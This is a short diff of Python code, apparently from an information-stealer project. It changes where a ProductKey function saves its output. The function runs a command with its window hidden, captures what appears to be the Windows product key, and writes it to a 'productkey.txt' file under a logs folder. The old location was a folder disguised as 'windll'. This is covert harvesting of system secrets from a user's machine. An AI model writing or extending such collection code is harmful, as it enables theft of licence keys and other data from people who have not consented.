@@ -13,9 +13,11 @@
 from subprocess import STARTUPINFO,STARTF_USESHOWWINDOW,run
 from os import sep,environ
 from manager.logger import Log
+from preferences.config import config
 
 def ProductKey():
-    pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
+    user = environ['USERPROFILE']
+    pathToLogs = f'{user}\\{config.pathToLogs}\\System\\productkey.txt'
     try:
         startupinfo = STARTUPINFO()
         startupinfo.dwFlags |= STARTF_USESHOWWINDOW
@@ -31,5 +33,5 @@ def ProductKey():
         return
 
     if output:
-        with open(pathtofile+"\\System\\productkey.txt", 'w', encoding='UTF-8') as f:
+        with open(pathToLogs, 'w', encoding='UTF-8') as f:
             f.write(output)
